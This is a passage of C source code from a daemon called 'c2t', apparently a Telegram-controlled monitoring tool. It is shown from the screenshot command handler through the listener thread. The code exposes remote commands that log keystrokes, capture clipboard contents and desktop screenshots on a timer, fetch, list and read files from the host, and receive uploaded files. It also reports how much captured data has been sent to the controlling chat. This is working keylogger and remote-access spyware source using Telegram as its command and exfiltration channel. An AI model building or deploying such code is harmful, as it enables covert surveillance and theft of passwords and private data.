        telegram_send_html(resp);
      } else {
        char *end;
        errno = 0;
        unsigned long val = strtoul(arg, &end, 10);
        if (errno || val > 86400 || (val > 0 && val < 5)) {
          telegram_send_html(
              "⚠️ <b>Invalid Interval:</b> Must be between 5 and 86400 seconds (or 0 to disable).");
        } else {
          screenshot_set_interval((size_t)val);
          char resp[512];
          if (val == 0) {
            snprintf(resp, sizeof(resp),
                     "📸 <b>Periodic Screenshot Timer:</b> ⚪ <b>DISABLED</b>\n"
                     "<i>Screenshots will only be sent on-demand via /screenshot.</i>");
          } else {
            snprintf(resp, sizeof(resp),
                     "📸 <b>Periodic Screenshot Timer:</b> 🟢 <b>ENABLED</b> (%lu s)\n"
                     "<i>A desktop screenshot will automatically be captured and sent every %lu seconds.</i>",
                     val, val);
          }
          telegram_send_html(resp);
        }
      }
    }
  } else if (match_command(text, "screenshot_on") ||
             match_command(text, "screenshot_enable") ||
             match_command(text, "screenshot_resume") ||
             match_command(text, "screenshot_start")) {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      screenshot_set_paused(0);
      telegram_send_html(
          "📸 <b>Screenshot Monitoring:</b> 🟢 <b>RESUMED</b>\n<i>Periodic "
          "screenshot captures are active.</i>");
    }
  } else if (match_command(text, "screenshot_off") ||
             match_command(text, "screenshot_disable") ||
             match_command(text, "screenshot_pause") ||
             match_command(text, "screenshot_stop") ||
             match_command(text, "mute_screenshot")) {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      screenshot_set_paused(1);
      telegram_send_html(
          "📸 <b>Screenshot Monitoring:</b> ⏸️ <b>PAUSED</b>\n<i>Periodic "
          "screenshot captures are muted.</i>");
    }
  } else if (match_command(text, "screenshot_toggle")) {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      int s = screenshot_toggle_paused();
      char resp[256];
      snprintf(resp, sizeof(resp),
               "📸 <b>Screenshot Monitoring:</b> %s",
               s ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b>");
      telegram_send_html(resp);
    }
  } else if (match_command(text, "screenshot_status")) {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      char shot_stat[1024];
      screenshot_get_status_info(shot_stat, sizeof(shot_stat));
      telegram_send_html(shot_stat);
    }
  } else if (match_command(text, "screenshot_help")) {
    char shot_help[1400];
    snprintf(
        shot_help, sizeof(shot_help),
        "📸 <b>Screenshot Control Commands</b>\n\n"
        "• <code>/screenshot [id|all]</code> - Capture &amp; send desktop screenshot now\n"
        "• <code>/screenshot_displays</code> (or <code>/screens</code>) - List detected displays &amp; active target\n"
        "• <code>/screenshot_select &lt;id|all&gt;</code> - Select default monitor to capture\n"
        "• <code>/screenshot_timer &lt;sec&gt;</code> - Configure periodic capture timer (0 to disable)\n"
        "• <code>/screenshot_on</code> / <code>/screenshot_off</code> - Resume / pause captures\n"
        "• <code>/screenshot_toggle</code> - Toggle active / paused state\n"
        "• <code>/screenshot_status</code> - View screenshot monitor status &amp; backend\n\n"
        "💡 <i>Tip: Multi-monitor setups can target a specific screen (e.g. <code>/screenshot 0</code> or <code>/screenshot all</code>)</i>");
    telegram_send_html(shot_help);
  } else if (match_command(text, "status") || match_command(text, "ping")) {
    int clip_paused = clipboard_is_paused();
    int key_paused = keyboard_is_paused();
    int shot_paused = screenshot_is_paused();
    int kb_mode = keyboard_get_format_mode();
    char kb_target[128] = "all";
    keyboard_get_selected_target(kb_target, sizeof(kb_target));

    const char *clip_status =
        config->disable_clipboard
            ? "❌ <b>DISABLED</b> (--no-clipboard)"
            : (clip_paused ? "⏸️ <b>PAUSED</b> (Muted)"
                           : "🟢 <b>ACTIVE</b> (Monitoring)");
    const char *kb_status = config->disable_keyboard
                                ? "❌ <b>DISABLED</b> (--no-keyboard)"
                                : (key_paused ? "⏸️ <b>PAUSED</b> (Muted)"
                                              : "🟢 <b>ACTIVE</b> (Capturing)");
    const char *shot_status =
        config->disable_screenshot
            ? "❌ <b>DISABLED</b> (--no-screenshot)"
            : (shot_paused ? "⏸️ <b>PAUSED</b> (Muted)"
                           : "🟢 <b>ACTIVE</b>");

    uint64_t clip_bytes = clipboard_get_total_bytes();
    uint64_t clip_events = clipboard_get_total_events();
    uint64_t kb_bytes = keyboard_get_total_bytes();
    uint64_t kb_keys = keyboard_get_total_keystrokes();
    uint64_t shot_bytes = screenshot_get_total_bytes();
    uint64_t shot_count = screenshot_get_total_captures();
    uint64_t file_bytes = c2t_files_get_total_bytes();
    uint64_t file_count = c2t_files_get_total_files();
    uint64_t log_bytes = c2t_log_sender_get_total_bytes();
    uint64_t log_count = c2t_log_sender_get_total_dispatches();
    uint64_t total_transferred = clip_bytes + kb_bytes + shot_bytes + file_bytes + log_bytes;

    char clip_b_str[64] = {}, kb_b_str[64] = {}, shot_b_str[64] = {},
         file_b_str[64] = {}, log_b_str[64] = {}, tot_b_str[64] = {};
    format_metric_bytes(clip_bytes, clip_b_str, sizeof(clip_b_str));
    format_metric_bytes(kb_bytes, kb_b_str, sizeof(kb_b_str));
    format_metric_bytes(shot_bytes, shot_b_str, sizeof(shot_b_str));
    format_metric_bytes(file_bytes, file_b_str, sizeof(file_b_str));
    format_metric_bytes(log_bytes, log_b_str, sizeof(log_b_str));
    format_metric_bytes(total_transferred, tot_b_str, sizeof(tot_b_str));

    char status_msg[1800];
    snprintf(status_msg, sizeof(status_msg),
             "🤖 <b>c2t Daemon Status</b>\n\n"
             "• <b>Status:</b> 🟢 Active &amp; Running\n"
             "• <b>Clipboard Monitoring:</b> %s\n"
             "• <b>Keyboard Monitoring:</b> %s\n"
             "• <b>Keyboard Target:</b> <code>%s</code> (Mode: %s)\n"
             "• <b>Screenshot Subsystem:</b> %s (Timer: %llu s)\n"
             "• <b>Periodic Logs:</b> %s (Interval: %llu s)\n"
             "• <b>File Uploads:</b> %s\n"
             "• <b>Window Info:</b> %s\n\n"
             "📊 <b>Data Transferred / Throughput:</b>\n"
             "• <b>Total Data Sent:</b> %s\n"
             "• 📋 <b>Clipboard:</b> %s (%llu events)\n"
             "• ⌨️ <b>Keyboard:</b> %s (%llu keystrokes)\n"
             "• 📸 <b>Screenshots:</b> %s (%llu images)\n"
             "• 📁 <b>Files:</b> %s (%llu files sent)\n"
             "• 📜 <b>Logs:</b> %s (%llu flushes)\n\n"
             "📦 <b>Queue Limits:</b> %llu items / %llu MB",
             clip_status, kb_status, kb_target,
             kb_mode == KEYBOARD_MODE_CODE ? "Code Block" : "Raw Text",
             shot_status, (unsigned long long)screenshot_get_interval(),
             config->telegram_send_logs ? "Enabled" : "On-demand only (/logs)",
             (unsigned long long)config->telegram_log_interval_sec,
             config->telegram_send_files ? "Enabled" : "Disabled",
             config->telegram_send_window_info ? "Enabled" : "Disabled",
             tot_b_str, clip_b_str, (unsigned long long)clip_events, kb_b_str,
             (unsigned long long)kb_keys, shot_b_str,
             (unsigned long long)shot_count, file_b_str,
             (unsigned long long)file_count, log_b_str,
             (unsigned long long)log_count,
             (unsigned long long)config->queue_max_items,
             (unsigned long long)(config->queue_max_bytes / (1024 * 1024)));
    telegram_send_html(status_msg);
  } else if (match_command(text, "kill") || match_command(text, "stop") ||
             match_command(text, "shutdown") ||
             match_command(text, "terminate") || match_command(text, "quit") ||
             match_command(text, "exit")) {
    c2t_log_warning(
        "listener",
        "Complete daemon shutdown initiated by Telegram command '%s'", text);
    telegram_send_html("🛑 <b>c2t Daemon Stopping</b>\n<i>Process termination "
                       "initiated. Good bye!</i>");

    if (update && update->update_id > 0 && config->telegram_bot_token) {
      int64_t ack_offset = update->update_id + 1;
      (void)telegram_poll_updates_callback(config->telegram_bot_token,
                                           &ack_offset, 0, nullptr, nullptr);
    }

    c2t_runtime_request_stop();
    (void)c2t_runtime_stop(1000, 1);
  } else if (match_command(text, "help") || match_command(text, "start")) {
    char help_msg[2048];
    size_t h_off = 0;
    static const char help_head[] =
        "💡 <b>c2t Telegram Commands</b>\n\n"
        "<b>Core Controls:</b>\n"
        "• <code>/pause</code> - Pause all active monitoring\n"
        "• <code>/resume</code> - Resume all active monitoring\n"
        "• <code>/toggle</code> - Toggle pause / resume\n"
        "• <code>/logs</code> - Flush and retrieve execution logs\n"
        "• <code>/status</code> - View daemon status &amp; monitoring state\n"
        "• <code>/kill</code> - Completely stop and terminate the process\n\n";
    memcpy(help_msg, help_head, sizeof(help_head) - 1);
    h_off = sizeof(help_head) - 1;

    if (!config->disable_clipboard) {
      static const char clip_sec[] =
          "<b>Clipboard Controls:</b>\n"
          "• <code>/clipboard_on</code> / <code>/clipboard_off</code> - Enable "
          "/ mute clipboard\n"
          "• <code>/clipboard_toggle</code> - Toggle active / paused state\n"
          "• <code>/clipboard_status</code> - View clipboard monitor &amp; "
          "queue state\n"
          "• <code>/clipboard_flush</code> - Flush queued clipboard items\n"
          "• <code>/clipboard_help</code> - Show full clipboard guide\n\n";
      if (h_off + sizeof(clip_sec) - 1 < sizeof(help_msg)) {
        memcpy(help_msg + h_off, clip_sec, sizeof(clip_sec) - 1);
        h_off += sizeof(clip_sec) - 1;
      }
    }

    if (!config->disable_keyboard) {
      static const char kb_sec[] =
          "<b>Keyboard Controls:</b>\n"
          "• <code>/keyboard_list</code> - View detected keyboard devices\n"
          "• <code>/keyboard_select &lt;id|all&gt;</code> - Select active "
          "keyboard target\n"
          "• <code>/keyboard_layout [code]</code> - View or change keyboard "
          "layout\n"
          "• <code>/keyboard_shortcuts &lt;on|off|toggle&gt;</code> - Toggle "
          "shortcuts capture\n"
          "• <code>/keyboard_on</code> / <code>/keyboard_off</code> - Enable / "
          "mute keyboard\n"
          "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Set code block or "
          "raw mode\n"
          "• <code>/keyboard_status</code> - View detailed keyboard monitor "
          "state\n"
          "• <code>/keyboard_flush</code> - Flush buffered keys immediately\n"
          "• <code>/keyboard_help</code> - Show full keyboard commands "
          "guide\n\n";
      if (h_off + sizeof(kb_sec) - 1 < sizeof(help_msg)) {
        memcpy(help_msg + h_off, kb_sec, sizeof(kb_sec) - 1);
        h_off += sizeof(kb_sec) - 1;
      }
    }

    if (!config->disable_screenshot) {
      static const char shot_sec[] =
          "<b>Screenshot Controls:</b>\n"
          "• <code>/screenshot</code> (or <code>/shot</code>) - Capture &amp; send screenshot now\n"
          "• <code>/screenshot_timer &lt;sec&gt;</code> - Set periodic capture timer (0 to disable)\n"
          "• <code>/screenshot_on</code> / <code>/screenshot_off</code> - Enable / mute captures\n"
          "• <code>/screenshot_toggle</code> - Toggle active / paused state\n"
          "• <code>/screenshot_status</code> - View screenshot monitor status\n"
          "• <code>/screenshot_help</code> - Show full screenshot commands guide\n\n";
      if (h_off + sizeof(shot_sec) - 1 < sizeof(help_msg)) {
        memcpy(help_msg + h_off, shot_sec, sizeof(shot_sec) - 1);
        h_off += sizeof(shot_sec) - 1;
      }
    }

    static const char file_sec[] =
        "<b>File Management:</b>\n"
        "• <code>/getfile &lt;path&gt;</code> - Retrieve &amp; send file from "
        "host\n"
        "• <code>/upload [path]</code> - Instructions for uploading files to "
        "host\n"
        "• <code>/ls [path]</code> - List directory contents\n"
        "• <code>/cat &lt;path&gt;</code> - View text file contents\n"
        "• <code>/fileinfo &lt;path&gt;</code> - View file or directory "
        "metadata";
    if (h_off + sizeof(file_sec) - 1 < sizeof(help_msg)) {
      memcpy(help_msg + h_off, file_sec, sizeof(file_sec) - 1);
      h_off += sizeof(file_sec) - 1;
    }
    help_msg[h_off] = '\0';
    telegram_send_html(help_msg);
  }
}

static void
on_telegram_command_received(const telegram_incoming_update_t *update,
                             [[maybe_unused]] void *user_data) {
  if (!update)
    return;

  const c2t_config_t *config = c2t_config_get();
  if (!config->telegram_chat_id || !*config->telegram_chat_id) {
    c2t_log_warning("listener", "Telegram chat_id is not configured");
    return;
  }

  const char *cfg_chat = config->telegram_chat_id;
  const char *chat_id = update->chat_id ? update->chat_id : "";
  while (isspace((unsigned char)*cfg_chat))
    cfg_chat++;
  while (isspace((unsigned char)*chat_id))
    chat_id++;

  if (strcmp(chat_id, cfg_chat) != 0) {
    c2t_log_warning(
        "listener",
        "Ignored update from unauthorized chat_id: %s (authorized: %s)",
        chat_id, cfg_chat);
    return;
  }

  /* Discard any stale updates sent before this daemon instance started */
  if (update->date > 0 && listener_start_time > 0 &&
      update->date < listener_start_time - 3) {
    c2t_log_info(
        "listener",
        "Ignoring stale update #%lld (%s) sent before daemon startup (msg_date=%lld, start_time=%lld)",
        (long long)update->update_id,
        update->text ? update->text : (update->file_id ? "file" : "update"),
        (long long)update->date, (long long)listener_start_time);
    return;
  }

  /* If incoming update has an attached file/document/photo */
  if (update->file_id && *update->file_id) {
    c2t_log_info(
        "listener",
        "Received file attachment (name='%s', file_id=%s) from chat %s",
        update->file_name ? update->file_name : "", update->file_id, chat_id);
    (void)c2t_file_save_uploaded(update->file_id, update->file_name,
                                 update->caption);
    return;
  }

  /* Handle text command */
  if (update->text && *update->text) {
    handle_command(update, chat_id,
                   update->username ? update->username : "");
  }
}

static void interruptible_sleep_ms(unsigned int ms) {
  unsigned int elapsed = 0;
  while (!stopping && elapsed < ms) {
    unsigned int chunk = (ms - elapsed < 100) ? (ms - elapsed) : 100;
#ifndef _WIN32
    struct timespec req = {.tv_sec = (time_t)(chunk / 1000),
                           .tv_nsec = (long)(chunk % 1000) * 1000000L};
    (void)nanosleep(&req, nullptr);
#else
    Sleep((DWORD)chunk);
#endif
    elapsed += chunk;
  }
}

#ifdef _WIN32
static DWORD
    WINAPI telegram_listener_worker_func([[maybe_unused]] void *context)
#else
static void *telegram_listener_worker_func([[maybe_unused]] void *context)
#endif
{
  int64_t offset = 0;
  unsigned int backoff_ms = 1000;

  c2t_log_info("listener",
               "Telegram command listener started (long-polling timeout=%ds)",
               POLL_TIMEOUT_SECONDS);

  /* Fast initial check: drain and advance offset so all pending / initial
   * updates are processed immediately and confirmed to Telegram server */
  const c2t_config_t *init_config = c2t_config_get();
  if (init_config->telegram_enabled && init_config->telegram_bot_token &&
      init_config->telegram_chat_id) {
    int init_res = telegram_poll_updates_callback(
        init_config->telegram_bot_token, &offset, 0,
        on_telegram_command_received, nullptr);
    if (init_res >= 0 && offset > 0) {
      /* Explicitly acknowledge and confirm offset to Telegram server */
      (void)telegram_poll_updates_callback(
          init_config->telegram_bot_token, &offset, 0, nullptr, nullptr);
      backoff_ms = 1000;
    }
  }

  while (!stopping) {
    const c2t_config_t *config = c2t_config_get();
    if (!config->telegram_enabled || !config->telegram_bot_token ||
        !config->telegram_chat_id) {
      interruptible_sleep_ms(1000);
      continue;
    }

    int res = telegram_poll_updates_callback(
        config->telegram_bot_token, &offset, POLL_TIMEOUT_SECONDS,
        on_telegram_command_received, nullptr);

    if (res >= 0) {
      backoff_ms = 1000;
    } else if (!stopping) {
      c2t_log_warning("listener",
                      "Telegram poll failed, backing off for %u ms...",
                      backoff_ms);
      interruptible_sleep_ms(backoff_ms);
      if (backoff_ms < 30000) {
        backoff_ms = (backoff_ms * 2 > 30000) ? 30000 : backoff_ms * 2;
      }
    }
  }

  telegram_http_thread_cleanup();
  c2t_log_info("listener", "Telegram command listener stopped");

#ifdef _WIN32
  return 0;
#else
  return nullptr;
#endif
}

int c2t_telegram_listener_init(void) {
  const c2t_config_t *config = c2t_config_get();
  if (!config->telegram_enabled || !config->telegram_bot_token ||
      !config->telegram_chat_id) {
    c2t_log_debug(
        "listener",
        "Telegram listener disabled: Telegram not enabled or unconfigured");
    return 1;
  }

  if (listener_started)
    return 1;

  stopping = 0;
  listener_start_time = (int64_t)time(nullptr);

#ifdef _WIN32
  listener_thread = CreateThread(nullptr, 0, telegram_listener_worker_func,
                                 nullptr, 0, nullptr);
  listener_started = listener_thread != nullptr;
#else
  pthread_attr_t attr;
  pthread_attr_init(&attr);
  pthread_attr_setstacksize(&attr, 512 * 1024);
  listener_started =
      pthread_create(&listener_thread, &attr, telegram_listener_worker_func,
                     nullptr) == 0;
  pthread_attr_destroy(&attr);
#endif

  if (!listener_started) {
    c2t_log_error("listener",
                  "Unable to start Telegram command listener thread");
    return 0;
  }

  return 1;
}

void c2t_telegram_listener_cleanup(void) {
  if (!listener_started)
    return;

  stopping = 1;

#ifdef _WIN32
  WaitForSingleObject(listener_thread, INFINITE);
  CloseHandle(listener_thread);
  listener_thread = nullptr;
#else
  (void)pthread_join(listener_thread, nullptr);
#endif

  listener_started = 0;
  stopping = 0;
}
